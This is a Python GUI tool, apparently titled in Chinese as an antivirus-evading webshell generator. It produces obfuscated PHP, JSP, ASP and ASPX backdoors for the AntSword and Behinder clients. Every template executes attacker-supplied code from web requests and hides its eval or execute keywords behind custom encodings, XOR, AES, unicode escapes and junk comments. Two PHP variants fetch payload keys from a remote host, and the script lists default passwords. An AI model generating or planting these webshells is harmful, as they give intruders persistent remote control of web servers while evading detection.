#coding:utf-8
import easygui as g
import sys
import random
import base64
import string
from random import shuffle

#php蚁剑
#换表base32
php_AntSword_baseX_shell = '''<?php
class {0}{15}
        public ${1} = null;
        public ${2} = null;
        function __construct(){15}
        $this->{1} = '{18}';
        if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){15}
        $this->{2} = @{3}($this->{1});
        ${2} = $this->{2};
        @eval/*1*/(${2}).{4};
    {16} 
        {16}{16} 
new {0}();
function {3}(${5}){15}
    ${7} = '{17}';
    ${5} = strval(${5});
    ${6} = str_split(${7});
    ${8} = array_flip(${6});
    if(!preg_match('/[a-zA-Z0-9]+/',${5})){15}
        return false;
    {16}
    ${9} = strlen(${5});
    ${11} = 0;
    ${10} = array();
    while(${11}<${9}){15}
        ${12} = decbin((${8}[${5}[${11}]]-${11}%2)/4);
        ${10}[] = str_pad(${12},4,'0',STR_PAD_LEFT);
        ++${11};
    {16}
    ${13} = '';
    ${10} = array_chunk(${10},2);
    foreach(${10} as ${14}){15}
        ${13} .= chr(bindec(join('',${14})));
    {16}
    return ${13};
{16}'''

php_AntSword_base32_shell = '''<?php
class {0}{1}
        public ${2} = null;
        public ${3} = null;
        function __construct(){1}
        $this->{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}
        $this->{3} = @{9}($this->{2});
        ${3}= $this->{3};
        @eval({5}.${3}.{5});
        {4}{4}{4}
new {0}();
function {6}(${7}){1}
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
    $v <<= 8;
        $v += ord(${7}[$i]);
        $vbits += 8;
        while ($vbits >= 5) {1}
            $vbits -= 5;
            ${8} .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);{4}{4}
    if ($vbits > 0){1}
        $v <<= (5 - $vbits);
        ${8} .= $BASE32_ALPHABET[$v];{4}
    return ${8};{4}
function {9}(${7}){1}
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
        $v <<= 5;
        if (${7}[$i] >= 'a' && ${7}[$i] <= 'z'){1}
            $v += (ord(${7}[$i]) - 97);
        {4} elseif (${7}[$i] >= '2' && ${7}[$i] <= '7') {1}
            $v += (24 + ${7}[$i]);
        {4} else {1}
            exit(1);
        {4}
        $vbits += 5;
        while ($vbits >= 8){1}
            $vbits -= 8;
            ${8} .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);{4}{4}
    return ${8};{4}
?>'''

php_AntSword_http_shell = '''<?php 
class {0}{6}
        public ${1} = '';
        function __construct(){6}
        ${2} = "http://192.168.150.133/1.txt";
        //此文本内容为 eval($_POST[zero]);
        ${3} = fopen(${2}, 'r');
        stream_get_meta_data(${3});
        while (!feof(${3})) {6}
            ${4}.= fgets(${3}, 1024);
        {5}
        $this->{1} = ${4};
        @eval($this->{1});
        {5}{5}
new {0}();
?>'''

php_AntSword_rot13_shell = '''<?php 

class {0}{1}
        public ${3} = null;
        public ${4} = null;
        function __construct(){1}
        if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}
        $this->{3} = 'riny($_CBFG[mreb]);';
        $this->{4} = @str_rot13($this->{3});
        @eval($this->{4}.{5});
        {2}{2}{2}
new {0}();

?>'''



php_AntSword_class_shell = '''<?php 
class {0}
{2}
  public ${1} = '';
  function __destruct(){2}
    eval({5}."$this->{1}");
  {3}
{3}
${4} = new {0};
${4}->{1} = $_POST['zero'];
function {6}(${1},${4}) {2}
    echo {5};
    echo {5};
    echo {5};
    echo {5};
    echo {5};
    echo {5};
    echo {5};
    echo {5};
{3}
?>'''


php_AntSword_kaisa_shell = '''<?php
class {0}{12}
        function __construct(){12}
        ${1} = "http://192.168.150.133/2.txt";
        //此txt文本内容为   3  
        ${2} = fopen(${1}, 'r');
        stream_get_meta_data(${2});
        while (!feof(${2})) {12}
            ${3}.= fgets(${2}, 1024);
        {13}
        $this->{4} = ${3};
        $this->{5} = "bs^i%!\MLPQXwbolZ&8";
        $this->{6} = @{7}($this->{5},$this->{4});
        @eval($this->{6});
        {13}{13}
new {0}();

function {7}(${8},${4}) {12}
${9} = [];
${10} = '';
${11} = ${8};
for ($i=0;$i<strlen(${11});$i++)
{12}
    ${9}[] = chr((ord(${11}[$i])+${4}));
{13}
${10} = implode(${9});
return ${10} ;
{13}
?>'''
#自定义加密1
php_AntSword_myencry_shell = '''<?php
$a = '11111111111111111111';
$b = $a ^ $a ^$a;
if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
eval($a ^ decrypt('nafFz2GGw7KEhbiLrsnVoY1Zbg==','1234') ^ $a);}
function decrypt($data, $key) {
$key = md5($key);
$x = 0;
$data = base64_decode($data);
$len = strlen($data);
$l = strlen($key);
for ($i = 0; $i < $len; $i++) {
if ($x == $l){ $x = 0;}
$char .= substr($key, $x, 1);
$x++;
}
for ($i = 0; $i < $len; $i++){
if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))){
$str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));

}else{
$str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
    }
}
return $str;}
?>'''

#自定义加密2
php_AntSword_myencry_class_shell = '''<?php
class env{
function __construct(){
    if(1){
    $b = 'PKKZSczUsM8FAF6COeXWjP9pwShxF';
    if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
    @@@@eval("/*aasa121224*/".decrypt($b)."/*sasa1212121212s121212*/");}}
}}
new env();
function decrypt($data,$key='CHENI'){
 $txt = urldecode($data); 
 $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; 
 $ch = $txt[0]; 
 $nh = strpos($chars,$ch); 
 $mdKey = md5($key.$ch); 
 $mdKey = substr($mdKey,$nh%8, $nh%8+7); 
 $txt = substr($txt,1); 
 $tmp = ''; 
 $i=0;$j=0; $k = 0; 
 for ($i=0; $i<strlen($txt); $i++) { 
  $k = $k == strlen($mdKey) ? 0 : $k; 
  $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]); 
  while ($j<0) $j+=64; 
  $tmp .= $chars[$j]; 
 } 
 return base64_decode($tmp); 
}
?>'''
#过AF马 
php_AntSword_AF_shell='''
<?=  
$a =<<< aa
assasssasssasssasssasssasssasssasssasssasssassss
aa;
eval/*12f*/(/*12f*/$_POST/*12f*/[zero])." /*sa11111*/"/*121?*///
."/* ##*/"; /*ff*///////////////////////////////////

?><?<!-- asasas as asasa sas a-->?><!-- asasas as asasa sas a-->'''


#php冰蝎

php_Behinder_1_shell = '''<?php
@error_reporting(0);
session_start();
    ${0}="e45e329feb5d925b"; 
    $_SESSION['k']=${0};
    session_write_close();
    ${1}="obuhaorpf5uw44dvoq";
    ${2}='openssl';
    ${3}={10}(${1});
    ${4}=file_get_contents(${3});
    ${5}=base64_decode('{19}');
    if(!extension_loaded(${2}))
    {17}
        ${6}="base64_"."decode";
        ${4}=${6}({16}.${4});
        
        for($i=0;$i<strlen(${4});$i++) {17}
                 
                {18}
    {18}
    else
    {17}
        eval(${5});
    {18}
    ${7}=explode('|',${4});
    ${8}=${7}[0];
    ${9}=${7}[1];
    class {15}{17}public function __invoke($p) {17}eval({16}.$p."");{18}{18}
    @call_user_func(new {15}(),${9});
    function {10}(${11}){17}
    ${12} = '';
    ${14} = 0;
    ${13} = 0;
    for ($i = 0, $j = strlen(${11}); $i < $j; $i++){17}
        ${14} <<= 5;
        if (${11}[$i] >= 'a' && ${11}[$i] <= 'z'){17}
            ${14} += (ord(${11}[$i]) - 97);
        {18} elseif (${11}[$i] >= '2' && ${11}[$i] <= '7') {17}
            ${14} += (24 + ${11}[$i]);
        {18} else {17}
            exit(1);
        {18}
        ${13} += 5;
        while (${13} >= 8){17}
            ${13} -= 8;
            ${12} .= chr(${14} >> ${13});
            ${14} &= ((1 << ${13}) - 1);{18}{18}
    return ${12};{18}

?>

'''

php_Behinder_2_shell = '''<?php
@error_reporting(0);
session_start();
    ${0}="e45e329feb5d925b"; 
    $_SESSION['k']=${0};
    session_write_close();
    ${1}="obuhaorpf5uw44dvoq";
    ${2}='openssl';
    ${3}={5}(${1});
    ${4}="file_get_"."contents";
    ${6}=${4}(${3});
    if(!extension_loaded(${2}))
    {15}
        ${7}="base64_"."decode";
        ${6}=${7}({14}.${6});
        
        for($i=0;$i<strlen(${6});$i++) {15}
                 
            {16}
    {16}
    ${6}=openssl_decrypt(${6}, "AES128", ${0});
    
    ${8}=explode('|',${6});
    ${9}=${8}[1];
    class {10}{15}public function __invoke($p) {15}eval({14}.$p."");{16}{16}
    @call_user_func(new {10}(),${9});
    function {5}($LZCG){15}
    ${11} = '';
    ${13} = 0;
    ${12} = 0;
    for ($i = 0, $j = strlen($LZCG); $i < $j; $i++){15}
        ${13} <<= 5;
        if ($LZCG[$i] >= 'a' && $LZCG[$i] <= 'z'){15}
            ${13} += (ord($LZCG[$i]) - 97);
        {16} elseif ($LZCG[$i] >= '2' && $LZCG[$i] <= '7') {15}
            ${13} += (24 + $LZCG[$i]);
        {16} else {15}
            exit(1);
        {16}
        ${12} += 5;
        while (${12} >= 8){15}
            ${12} -= 8;
            ${11} .= chr(${13} >> ${12});
            ${13} &= ((1 << ${12}) - 1);{16}{16}
    return ${11};{16}

?>
'''

#jsp蚁剑

jsp_AntSword_uncode_shell = '''<%!class {2} extends ClassLoader{0} {2}(ClassLoader {3}){0} super({3}); {1}public Class g(byte []b){0} return super.d\uuuuuuuuuuuuuuuuuuuuuuuuuuuu0065fineClass(b,0,b.length); {1}{1}%><% String cls=request.g\u0065tParameter("zero");if(cls!=null){0} new {2}(this.\uuu0067etClass().\u0067\u0065t\u0043l\u0061ss\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu004Coad\u0065\u0072()).g(new sun.misc.{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}().decodeBuffer(cls)).newInstance().\u0065quals(pageContext); {1}%>









'''


#jsp冰蝎

jsp_Behinder_uncode_shell = '''<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class {0} extends ClassLoader{17}{0}(ClassLoader {1}){17}super({1});{18}public Class {3}(byte []b){17}return super.d\uuuuuuuuuuuuuuuuuuuuuuuuuuuu0065fineClass(b,0,b.length);{18}{18}%><%if (request.\u0067etMethod().\u0065quals("POST")){17}String {2}="e45e329feb5d925b";session.putValue("u",{2});Cipher {1}=Cipher.\u0067etInstanc\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0065("AES");{1}.init(2,new SecretKeySpec({2}.\u0067etBytes(),"AES"));new {0}(this.\u0067etClass().\u0067\u0065t\u0043l\u0061ss\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu004Coad\u0065\u0072()).{3}({1}.doFinal(new sun.misc.{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}().d\u0065codeBuffer(request.\u0067etReader().readLine()))).newInstance().\u0065quals(pageContext);{18}%>








'''

#asp蚁剑
asp_AntSword_func_shell = '''<%
<!--
Function {0}():
    {0} = request("zero")
End Function
Function {1}():
    execUte({0}())REM )
End Function
{1}()
-->
%>'''

asp_AntSword_class_shell = '''<%
Class {0}
    public property let {1}({2})
    exeCute({2})REM {3})
    end property
End Class

Set a= New {0}
a.{1}= request("zero")
%>'''

asp_AntSword_enc_shell = '''<%
eXecUTe({0}("92002200F60027005600A7002200820047003700560057001700560027000200C60016006700560077007600"))REM )
function {0}(text)
    const {4}="gw"
    dim {1} : {1}=text
    dim {2}
    dim {3} : {3}=strreverse({1}) 
    for i=1 to len({3}) step 4
        {2}={2} & ChrW(cint("&H" & mid({3},i,4)))
    next
    {0}=mid({2},len({4})+1,len({1})-len({4}))
end function
%>'''
#asp冰蝎

asp_Behinder_1_shell = '''<%
Response.CharSet = "UTF-8" 
{0}="e45e329feb5d925b" 
Session("k")={0}
{1}=Request.TotalBytes
{2}=Request.BinaryRead({1})
For i=1 To {1}

{4}={4}&Chr(1  Xor ascb(midb({2},i,1)) Xor Asc(Mid({0},(i and 15)+1,1)) Xor 1)
Next
%><%'{3}%><%execute({4})
%>'''

asp_Behinder_2_shell = '''<%
Response.CharSet = "UTF-8" 
{0}="e45e329feb5d925b" 
Session("k")={0}
{1}=Request.TotalBytes
{2}=Request.BinaryRead({1})
For i=1 To {1}
{3}=ascb(midb({2},i,1)) Xor Asc(Mid({0},(i and 15)+1,1))
{4}={4}&Chr({3})
Next
%><%'{5}%><%execute({4})
%>'''

asp_Behinder_3_shell = '''<%
Response.CharSet = "UTF-8" 
{0}="e45e329feb5d925b" 
Session("k")={0}
{1}=Request.TotalBytes
{2}=Request.BinaryRead({1})
For i=1 To {1}
{3}=ascb(midb({2},i,1)) Xor Asc(Mid({0},(i and 15)+1,1))
{4}={4}&Chr({3})
Next
execute({4})REM )
%>'''
#aspx蚁剑

aspx_AntSword_func_shell = '''<%@ Page Language="Jscript" Debug=true%>
<%
function {2}()
{6}

{7}
function {3}()
{6}
var {0}=Request.Form["zero"];
var {1}="unsaf",{5}="e",{4}={1}+{5};
eval({0},{4});
{7}
{3}()
%>'''

#aspx冰蝎
aspx_Behinder_1_shell = '''<%@Language=CSharp%>{3};{4}<%@Import Namespace="System.Reflection"%><%{5}Session.Add(@"k","e45e329feb5d925b");byte[] {0} = Encoding.Default.GetBytes(Session[0] + ""),{1} = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor({0}, {0}).TransformFinalBlock{2}({1}, 0, {1}.Length)).{2}CreateInstance("U").Equals{2}(this);%>





'''

aspx_Behinder_2_shell = '''<%@Import Namespace="System.Reflection"%><%{3}Session.Add(@"k","e45e329feb5d925b");byte[] {0} = Encoding.Default.GetBytes(Session[0] + ""),{1} = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor({0}, {0}).TransformFinalBlock{2}({1}, 0, {1}.Length)).{2}CreateInstance("U").Equals{2}(this);%><%@ Page Language="CSharp" %>;





'''

def random_keys(len):
    str = '012345678abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))  

def random_base_key():
    s ='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    # 将字符串转换成列表
    str_list = list(s)
    # 调用random模块的shuffle函数打乱列表
    shuffle(str_list)
    # 将列表转字符串
    return ''.join(str_list)

#换表base62
letters=random_base_key()
def encryption(inputString):
    # 将输入字符转化为二进制
    
    ascii = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
             for i in inputString]
    #连接所有二进制
    joinData = ''.join(ascii)
    #四个一组进行分组
    num = len(joinData)
    numList=[]
    for z in range(0,num):
        if int(z%4) == 0:
            numList.append(z)
        
    joinDataList = [joinData[x:x+4] for x in numList]
    #二进制转换为十进制
    joinDataList = [int(x, 2) for x in joinDataList]
    
    #十进制乘4加自增变量取2余数并循环
    findList=[]
    i=0
    for q,y in enumerate(joinDataList):
        if q % 2 == 0 :
            findList.append(int(y*4)+int(0))
        else:
            findList.append(int(y*4)+int(1))

    outputS = ''.join([letters[x] for x in findList])
    return outputS
# php蚁剑
# 
def build_php_AntSword_baseX_shell():
    #18个变量
    str1 = "eval($_POST[zero]);"
    var0 = random_name(4)
    var1 = random_name(4)
    var2 = random_name(4)
    var3 = random_name(4)
    var4 = "\"/*"+random_keys(7)+"*/\""
    var5 = random_name(4)
    var6 = random_name(4)
    var7 = random_name(4)
    var8 = random_name(4)
    var9 = random_name(4)
    var10 = random_name(4)
    var11 = random_name(4)
    var12 = random_name(4)
    var13 = random_name(4)
    var14 = random_name(4)
    var15 = '''{'''
    var16 = '''}'''
    var17 = letters
    var18 = encryption(str1)
    shellc = php_AntSword_baseX_shell.format(var0,var1,var2,var3,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,var16,var17,var18)
    return shellc

def build_php_AntSword_base32_shell():
    className = random_name(4)
    lef = '''{'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    rig = '''}'''
    disrupt = "\"/*"+random_keys(7)+"*/\""
    fun1 = random_name(4)
    fun1_vul = random_name(4)
    fun1_ret = random_name(4)
    fun2 = random_name(4)
    shellc = php_AntSword_base32_shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2)
    return shellc

def build_php_AntSword_http_shell():
    className = random_name(4)
    lef = '''{'''
    rig = '''}'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    parameter4 = random_name(4)
    shellc = php_AntSword_http_shell.format(className,parameter1,parameter2,parameter3,parameter4,rig,lef)
    return shellc

def build_php_AntSword_rot13_shell():
    className = random_name(4)
    lef = '''{'''
    rig = '''}'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    disrupt = "\"/*"+random_keys(7)+"*/\""
    shellc = php_AntSword_rot13_shell.format(className,lef,rig,parameter1,parameter2,disrupt)
    return shellc

def build_php_AntSword_class_shell():
    className = random_name(4)
    lef = '''{'''
    rig = '''}'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    fun = random_name(4)
    disrupt = "\"/*"+random_keys(7)+"*/\""
    shellc = php_AntSword_class_shell.format(className,parameter1,lef,rig,parameter2,disrupt,fun)
    return shellc

def build_php_AntSword_kaisa_shell():
    className = random_name(4)
    lef = '''{'''
    rig = '''}'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    parameter4 = random_name(4)
    parameter5 = random_name(4)
    parameter6 = random_name(4)
    parameter7 = random_name(4)
    parameter8 = random_name(4)
    parameter9 = random_name(4)
    parameter10 = random_name(4)
    fun = random_name(5)
    shellc = php_AntSword_kaisa_shell.format(className,parameter1,parameter2,parameter3,parameter4,parameter5,parameter6,fun,parameter7,parameter8,parameter9,parameter10,lef,rig)
    return shellc

#php冰蝎
def build_php_Behinder_1_shell():

    parameter0 = random_name(4)
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    parameter4 = random_name(4)
    parameter5 = random_name(4)
    parameter6 = random_name(4)
    parameter7 = random_name(4)
    parameter8 = random_name(4)
    parameter9 = random_name(4)
    parameter10 = random_name(4)
    parameter11 = random_name(4)
    parameter12 = random_name(4)
    parameter13 = random_name(4)
    parameter14 = random_name(4)
    disrupt = "\"/*"+random_keys(7)+"*/\""
    lef = '''{'''
    rig = '''}'''
    parameter15 = random_name(4)
    code = code = base64.b64encode("$"+str(parameter4)+"=openssl_decrypt($"+str(parameter4)+", 'AES128', $"+str(parameter0)+");")
    shellc = php_Behinder_1_shell.format(parameter0,parameter1,parameter2,parameter3,parameter4,parameter5,parameter6,parameter7,parameter8,parameter9,parameter10,parameter11,parameter12,parameter13,parameter14,parameter15,disrupt,lef,rig,code)
    return shellc

def build_php_Behinder_2_shell():
    parameter0 = random_name(4)
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    parameter4 = random_name(4)
    parameter5 = random_name(4)
    parameter6 = random_name(4)
    parameter7 = random_name(4)
    parameter8 = random_name(4)
    parameter9 = random_name(4)
    parameter10 = random_name(4)
    parameter11 = random_name(4)
    parameter12 = random_name(4)
    parameter13 = random_name(4)
    disrupt = "\"/*"+random_keys(7)+"*/\""
    lef = '''{'''
    rig = '''}'''
    shellc = php_Behinder_2_shell.format(parameter0,parameter1,parameter2,parameter3,parameter4,parameter5,parameter6,parameter7,parameter8,parameter9,parameter10,parameter11,parameter12,parameter13,disrupt,lef,rig)
    return shellc

#jsp蚁剑

def build_jsp_AntSword_uncode_shell():
    arr1 = ['\u0042','B']
    arr2 = ['\u0041','A']
    arr3 = ['\u0053','S']
    arr4 = ['\u0045','E']
    arr5 = ['\u0036','6']
    arr6 = ['\u0034','4']
    arr7 = ['\u0044','D']
    arr8 = ['\u0065','e']
    arr9 = ['\u0063','c']
    arr10 = ['\u006f','o']
    arr11 = ['\u0064','d']
    arr12 = ['\u0065','e']
    string1 = '\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0072'

    lef = '''{'''
    rig = '''}'''
    var1 = random_name(4)
    var2 = random_name(4)
    var3 = random.choice(arr1)
    var4 = random.choice(arr2)
    var5 = random.choice(arr3)
    var6 = random.choice(arr4)
    var7 = random.choice(arr5)
    var8 = random.choice(arr6)
    var9 = random.choice(arr7)
    var10 = random.choice(arr8)
    var11 = random.choice(arr9)
    var12 = random.choice(arr10)
    var13 = random.choice(arr11)
    var14 = random.choice(arr12)
    var15 = string1
    shellc = jsp_AntSword_uncode_shell.format(lef,rig,var1,var2,var3,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15)
    return shellc


#jsp冰蝎

def build_jsp_Behinder_uncode_shell():
    arr1 = ['\u0042','B']
    arr2 = ['\u0041','A']
    arr3 = ['\u0053','S']
    arr4 = ['\u0045','E']
    arr5 = ['\u0036','6']
    arr6 = ['\u0034','4']
    arr7 = ['\u0044','D']
    arr8 = ['\u0065','e']
    arr9 = ['\u0063','c']
    arr10 = ['\u006f','o']
    arr11 = ['\u0064','d']
    arr12 = ['\u0065','e']
    string1 = '\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0072'

    lef = '''{'''
    rig = '''}'''
    parameter0 = random_name(4)
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    var3 = random.choice(arr1)
    var4 = random.choice(arr2)
    var5 = random.choice(arr3)
    var6 = random.choice(arr4)
    var7 = random.choice(arr5)
    var8 = random.choice(arr6)
    var9 = random.choice(arr7)
    var10 = random.choice(arr8)
    var11 = random.choice(arr9)
    var12 = random.choice(arr10)
    var13 = random.choice(arr11)
    var14 = random.choice(arr12)
    var15 = string1
    shellc = jsp_Behinder_uncode_shell.format(parameter0,parameter1,parameter2,parameter3,var3,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,lef,rig)
    return shellc


#asp蚁剑
def build_asp_AntSword_func_shell():
    FunctionName = random_name(4)
    parameter = random_name(4)
    shellc = asp_AntSword_func_shell.format(FunctionName,parameter)
    return shellc

def build_asp_AntSword_class_shell():
    className = random_name(5)
    func = random_name(5)
    parameter = random_name(5)
    rand = random_name(5)
    shellc = asp_AntSword_class_shell.format(className,func,parameter,rand)
    return shellc
def build_asp_AntSword_enc_shell():
    func = random_name(5)
    var1 = random_name(4)
    var2 = random_name(4)
    var3 = random_name(4)
    var4 = random_name(4)
    shellc = asp_AntSword_enc_shell.format(func,var1,var2,var3,var4)
    return shellc
#asp冰蝎
def build_asp_Behinder_1_shell():
    parameter0 = random_name(5)
    parameter1 = random_name(5)
    parameter2 = random_name(5)
    rand = random_keys(7)
    parameter3 = random_name(5)
    shellc = asp_Behinder_1_shell.format(parameter0,parameter1,parameter2,rand,parameter3)
    return shellc

def build_asp_Behinder_2_shell():
    parameter0 = random_name(5)
    parameter1 = random_name(5)
    parameter2 = random_name(5)
    parameter3 = random_name(5)
    parameter4 = random_name(5)
    rand = random_keys(7)

    shellc = asp_Behinder_2_shell.format(parameter0,parameter1,parameter2,parameter3,parameter4,rand)
    return shellc

def build_asp_Behinder_3_shell():
    parameter0 = random_name(5)
    parameter1 = random_name(5)
    parameter2 = random_name(5)
    parameter3 = random_name(5)
    parameter4 = random_name(5)
    shellc = asp_Behinder_3_shell.format(parameter0,parameter1,parameter2,parameter3,parameter4)
    return shellc
#aspx蚁剑

def build_aspx_AntSword_func_shell():
    parameter = random_name(4)
    parameter1 = random_name(4)
    FunctionName = random_name(4)
    FunctionName1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    lef = '''{'''
    rig = '''}'''
    shellc = aspx_AntSword_func_shell.format(parameter,parameter1,FunctionName,FunctionName1,parameter2,parameter3,lef,rig)
    return shellc

#aspx冰蝎
def build_aspx_Behinder_1_shell():
    parameter0 = random_name(5)
    parameter1 = random_name(5)
    parameter2 = "/*"+random_keys(7)+"*/"
    lef = '''{'''
    rig = '''}'''
    shellc = aspx_Behinder_1_shell.format(parameter0,parameter1,parameter2,lef,rig,parameter2)
    return shellc

def build_aspx_Behinder_2_shell():
    parameter0 = random_name(5)
    parameter1 = random_name(5)
    parameter2 = "/*"+random_keys(7)+"*/"
    shellc = aspx_Behinder_2_shell.format(parameter0,parameter1,parameter2,parameter2)
    return shellc

msg="请选择需要生成的脚本语言 注：冰蝎默认密码为rebeyond，蚁剑默认密码为zero，php蚁剑需要添加GET参数 pass=pureqh"
msg1="请选择webshell客户端类型"
title="免杀webshell生成器-by：pureqh"   #  标题
choices=['php','jsp','asp','aspx']  # 先选择语言
Type_choice=['Behinder','AntSword'] # 客户端类型                          
choice=g.choicebox(msg,title,choices) #  在这里 choice 可以得到上面你选择的那个选项
if choice =='php':
    choice1=g.choicebox(msg1,title,Type_choice)
    if choice1=='AntSword':
        #蚁剑webshell
        msg2="请选择webshell关键字加密类型,basex为随机换表base62编码处理关键字，base32类型为通过base32编码方式处理关键字，http类型为http请求的方式加载关键字，rot13类型为通过类加载和rot13加解密方式处理关键字，class类型通过类加载和垃圾代码填充处理关键字,kaisa+类型通过凯撒加密和http获取key处理关键字,后面两种为自定义加密加密关键字"
        php_AntSword_shell_choice=['baseX','base32','http','rot13','class','kaisa+','myencry','myencry+class','AF']
        choice2=g.choicebox(msg2,title,php_AntSword_shell_choice)
        if  choice2=='baseX':
            #base32加密关键字
            g.msgbox(build_php_AntSword_baseX_shell(),'webshell')
            sys.exit()
        elif choice2=='base32':
            #base32加密关键字
            g.msgbox(build_php_AntSword_base32_shell(),'webshell')
            sys.exit()
        elif choice2=='http':
            #http加载关键字
            g.msgbox(build_php_AntSword_http_shell(),'webshell')
            sys.exit()
        elif choice2=='rot13':
            #rot13
            g.msgbox(build_php_AntSword_rot13_shell(),'webshell')
            sys.exit()
        elif choice2=='class':
            #类加载加垃圾函数
            g.msgbox(build_php_AntSword_class_shell(),'webshell')
            sys.exit()
        elif choice2=='kaisa+':
            #凯撒+http
            g.msgbox(build_php_AntSword_kaisa_shell(),'webshell')
            sys.exit()
        elif choice2=='myencry':
            #自定义加密算法
            g.msgbox(php_AntSword_myencry_shell,'webshell')
            sys.exit()
        elif choice2=='myencry+class':
            #自定义加密算法
            g.msgbox(php_AntSword_myencry_class_shell,'webshell')
            sys.exit()
        elif choice2=="AF":
            #AF马
            g.msgbox(php_AntSword_AF_shell,'webshell')
            sys.exit()
        else:
            sys.exit()
    elif choice1=='Behinder' :
        #冰蝎webshell
        msg3="选项1为关键语句加密关键字分离，选项2为关键字关键函数分离"
        php_Behinder_shell_choice=['1','2']
        choice3=g.choicebox(msg3,title,php_Behinder_shell_choice)
        if choice3=='1':
            #build_php_Behinder_1_shell
            g.msgbox(build_php_Behinder_1_shell(),'webshell')
            sys.exit()
        elif choice3=='2':
            #build_php_Behinder_2_shell
            g.msgbox(build_php_Behinder_2_shell(),'webshell')
            sys.exit()
        else:
            sys.exit()
    else:
        sys.exit()
        
    
elif choice == 'jsp':
#jsp
    # 选择支持冰蝎或蚁剑
    choice4=g.choicebox(msg1,title,Type_choice)
    if choice4=='AntSword':
        #蚁剑webshell
        g.msgbox(build_jsp_AntSword_uncode_shell(),'webshell')
        sys.exit()
    
    elif choice4=='Behinder':
        #冰蝎webshell
        g.msgbox(build_jsp_Behinder_uncode_shell(),'webshell')
        sys.exit()
    else:
        sys.exit()

elif choice == 'asp':
#asp
    choice5=g.choicebox(msg1,title,Type_choice)
    if choice5=='AntSword':
        #蚁剑webshell
        msg6="选项1为函数分割，选项2为类加载，选项3为关键字加解密"
        asp_AntSword_shell_choice=['1','2','3']
        choice8=g.choicebox(msg6,title,asp_AntSword_shell_choice)
        if choice8=='1':
            g.msgbox(build_asp_AntSword_func_shell(),'webshell')
            sys.exit()
        elif choice8=='2':
            g.msgbox(build_asp_AntSword_class_shell(),'webshell')
            sys.exit()
        elif choice8=='3':
            g.msgbox(build_asp_AntSword_enc_shell(),'webshell')
            sys.exit()
        else:
            sys.exit()
    
    elif choice5=='Behinder':
        #冰蝎webshell
        msg4="选项1为关键语句分离、多次异或，选项2为关键字关键语句分离，选项3为注释分割正则"
        asp_Behinder_shell_choice=['1','2','3']
        choice6=g.choicebox(msg4,title,asp_Behinder_shell_choice)
        if choice6=='1':

            g.msgbox(build_asp_Behinder_1_shell(),'webshell')
            sys.exit()
        elif choice6=='2':
            g.msgbox(build_asp_Behinder_2_shell(),'webshell')
            sys.exit()
        elif choice6=='3':
            g.msgbox(build_asp_Behinder_3_shell(),'webshell')
            sys.exit()
        else:
            sys.exit()
